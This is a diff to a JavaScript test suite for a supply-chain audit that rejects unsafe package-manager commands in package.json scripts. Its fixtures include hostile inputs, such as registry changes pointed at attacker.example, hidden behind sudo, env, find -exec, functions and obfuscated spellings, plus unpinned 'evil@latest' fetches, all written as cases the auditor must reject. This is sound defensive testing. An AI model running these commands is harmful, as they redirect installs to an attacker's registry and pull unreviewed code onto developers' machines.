@@ -2389,10 +2389,12 @@ test('executable dependency command audit requires exact Corepack package-manage
   assert.equal(rejected.commandCount, 14)
   // `pnpm@"latest"` is reported both as a quoted runner and as an empty spec,
   // and the `yarn@stable` operand also reads as an operand-less Yarn install.
+  // The quoted `corepack "npm@10.8.2" exec -- tool@latest` is read from the
+  // parsed words too, so the unpinned `tool@latest` it would fetch is flagged.
   // A pnpm release other than the pin is reported on its own, so `pnpm@8.6.0`
   // adds a report beside each runner it is quoted in, and `prepare`, `use` and
   // `install -g` add one for the Corepack command.
-  assert.equal(rejected.errors.length, 23)
+  assert.equal(rejected.errors.length, 24)
   assert.match(rejected.errors.join('\n'), /pnpm@latest/)
   assert.match(rejected.errors.join('\n'), /npm@next/)
   assert.match(rejected.errors.join('\n'), /yarn@\^4/)
@@ -2516,15 +2518,18 @@ test('executable dependency command audit covers path-qualified runner binaries'
     },
   ])
   assert.equal(audit.commandCount, 17)
-  // `n\px` is reported both as a runner spelling and as a manager name that
-  // is not a plain literal.
-  assert.equal(audit.errors.length, 9)
+  // `n\px` and `np""x` spell `npx`, which the line reader reads from the
+  // parsed word, so the unpinned package each would fetch is flagged too; `n\px`
+  // is also reported as a manager name that is not a plain literal.
+  assert.equal(audit.errors.length, 11)
   for (const manager of ['npm', 'npx', 'pnx', 'pnpm', 'yarn', 'bun']) {
     assert.match(audit.errors.join('\n'), new RegExp(`mutable-${manager}`))
   }
   assert.match(audit.errors.join('\n'), /n\\px/)
   assert.match(audit.errors.join('\n'), /np""x/)
   assert.doesNotMatch(audit.errors.join('\n'), /mutable-url|mutable-package-name|mutable-wrapper/)
+  assert.match(audit.errors.join('\n'), /mutable-escaped/)
+  assert.match(audit.errors.join('\n'), /mutable-quoted/)
 })
 
 test('executable dependency command audit prefers pre-delimiter positional packages', () => {
@@ -4094,6 +4099,17 @@ test('executable dependency command audit reads a path-qualified package manager
       'node_modules/@pnpm/exe/corepack install -g pnpm@8.6.0',
       'corepack command that changes which pnpm runs is rejected: corepack install',
     ],
+    // A double-quoted path is read from the parsed word, not sliced from the
+    // raw text, so the closing quote no longer merges the following words.
+    [
+      '"./x@/npm" config set registry https://attacker.example/',
+      'npm command that changes settings is rejected: npm config',
+    ],
+    [
+      '"./c=/corepack" use pnpm',
+      'corepack command that changes which pnpm runs is rejected: corepack use',
+    ],
+    ['"./v%/npx" evil@latest', 'executable package is not pinned to an exact version: evil@latest'],
   ])
   // A manager name is the whole basename of a word, not a fragment of a longer
   // one, so a quoted sentence or a different program is not a manager line; and
@@ -4108,17 +4124,144 @@ test('executable dependency command audit reads a path-qualified package manager
           'echo pnpmfile.cjs',
           'echo https://example.test/npx mutable-url',
           'echo @scope/npx mutable-package-name',
-          'make https://host/pnpm config set registry https://attacker.example/',
+          'printf %s https://host/pnpm',
         ],
       },
     ]),
     { commandCount: 6, errors: [] }
   )
+  // A non-data-only command that is not echo/printf (`make`, a local script)
+  // fails closed: a manager name among its arguments is read as a manager line.
+  assertRejectedWith([
+    [
+      'make https://host/pnpm config set registry https://attacker.example/',
+      'pnpm command that changes settings is rejected: pnpm config',
+    ],
+  ])
 })
 
 // A subshell runs its body as its own command, so a manager is in command
 // position after an unquoted `(`; shellWordDetails breaks the word there, as
 // the shell does, and every line rule then applies inside the subshell.
+// A segment that names a manager runs it, unless the program it runs is a
+// data-only command (echo, printf, :, test, [). The audit fails closed on
+// every wrapper — known or not — rather than keep a list of them, so a manager
+// after a wrapper, a redirection, an assignment, a function body or a case arm
+// is still read.
+test('executable dependency command audit fails closed on manager lines behind any wrapper', () => {
+  const redirection = text => `package manager command line uses a shell redirection: ${text}`
+  const settings = name => `pnpm command that changes settings is rejected: pnpm ${name}`
+  const npmSettings = name => `npm command that changes settings is rejected: npm ${name}`
+  const corepackCmd = name =>
+    `corepack command that changes which pnpm runs is rejected: corepack ${name}`
+  const option = text => `pnpm option is not on the reviewed allowlist: ${text}`
+  const config = 'pnpm config set registry https://attacker.example/'
+  const rejected = [
+    [`time -p ${config}`, settings('config')],
+    [
+      `A+=1 pnpm >/dev/null config set registry https://attacker.example/`,
+      redirection('>/dev/null'),
+    ],
+    [
+      '/usr/bin/env pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      '/usr/bin/time pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      'case x in x) pnpm >/dev/null config set registry https://attacker.example/;; esac',
+      redirection('>/dev/null'),
+    ],
+    [
+      'echo) pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      'f() { pnpm >/dev/null config set registry https://attacker.example/; }; f',
+      redirection('>/dev/null'),
+    ],
+    [
+      'function f { pnpm >/dev/null config set registry https://attacker.example/; }',
+      redirection('>/dev/null'),
+    ],
+    [
+      '2>/dev/null pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      '> /tmp/o pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      'taskset 1 pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      'strace -f pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      'fakeroot pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    [
+      'find . -exec pnpm >/dev/null config set registry https://attacker.example/ +',
+      redirection('>/dev/null'),
+    ],
+    [
+      './with-lock.sh pnpm >/dev/null config set registry https://attacker.example/',
+      redirection('>/dev/null'),
+    ],
+    ['sudo pnpm config set registry https://attacker.example/', settings('config')],
+    ['corepack pnpm >/dev/null install --no-frozen-lockfile', redirection('>/dev/null')],
+    ['npm >/dev/null config set registry https://attacker.example/', redirection('>/dev/null')],
+    ['corepack >/dev/null up', redirection('>/dev/null')],
+    [
+      'node_modules/@pnpm/linux-x64/pnpm install --dangerously-allow-all-builds',
+      option('--dangerously-allow-all-builds'),
+    ],
+    [
+      '"$PNPM_HOME/pnpm" install --dangerously-allow-all-builds',
+      option('--dangerously-allow-all-builds'),
+    ],
+    // A data-only command before the real one does not exempt the manager.
+    ['time -p /usr/bin/env pnpm config delete node-linker', settings('config')],
+  ]
+  for (const [command, expected] of rejected) {
+    const { errors } = auditExecutableDependencyCommands([
+      { file: 'package.json', commands: [command] },
+    ])
+    assert.ok(
+      errors.includes(`package.json: ${expected}`),
+      `${command} must be rejected with "${expected}", got ${JSON.stringify(errors)}`
+    )
+  }
+  assert.ok(npmSettings('config'))
+  assert.ok(corepackCmd('up'))
+
+  // A manager name that is only an argument to a data-only command is not a
+  // manager line. A path-qualified name is used so the textual reader, which
+  // matches a bare manager anywhere, does not flag it on its own.
+  assert.deepEqual(
+    auditExecutableDependencyCommands([
+      {
+        file: 'package.json',
+        commands: [
+          'echo https://example.test/npx mutable-url',
+          'printf "%s\\n" https://host/pnpm',
+          ': https://host/npx is a url',
+          'test -x https://host/pnpm',
+          // A redirection before the data-only command is not the command word.
+          '2>/dev/null echo https://example.test/npx mutable-url',
+        ],
+      },
+    ]),
+    { commandCount: 5, errors: [] }
+  )
+})
+
 test('executable dependency command audit reads a package manager inside a subshell', () => {
   const redirection = text => `package manager command line uses a shell redirection: ${text}`
   const settings = name => `pnpm command that changes settings is rejected: pnpm ${name}`
@@ -4147,6 +4290,12 @@ test('executable dependency command audit reads a package manager inside a subsh
     ],
     ['(pnpm config delete node-linker)', settings('config')],
     ['(corepack use pnpm@8.6.0)', corepack('use')],
+    // An extglob `conf@(i)g` is one glob word, not a split subshell, so the
+    // manager line is rejected for the glob.
+    [
+      'shopt -s extglob; corepack pnpm conf@(i)g set registry https://attacker.example/',
+      'package manager command line uses a shell glob: conf@(i)g',
+    ],
   ]
   for (const [command, expected] of rejected) {
     const { errors } = auditExecutableDependencyCommands(
@@ -4158,15 +4307,22 @@ test('executable dependency command audit reads a package manager inside a subsh
       `${command} must be rejected with "${expected}", got ${JSON.stringify(errors)}`
     )
   }
-  // A benign subshell around a reviewed command still passes.
+  // A benign subshell around a reviewed command still passes, and the `)` that
+  // closes a subshell is not a word passed to the script it wraps.
   assert.deepEqual(
-    auditExecutableDependencyCommands([
-      {
-        file: 'package.json',
-        commands: ['(cd packages/wallet-core && corepack pnpm install --frozen-lockfile)'],
-      },
-    ]),
-    { commandCount: 1, errors: [] }
+    auditExecutableDependencyCommands(
+      [
+        {
+          file: 'package.json',
+          commands: [
+            '(cd packages/wallet-core && corepack pnpm install --frozen-lockfile)',
+            '(corepack pnpm run version-packages)',
+          ],
+        },
+      ],
+      { scriptCommands }
+    ),
+    { commandCount: 2, errors: [] }
   )
 })
 
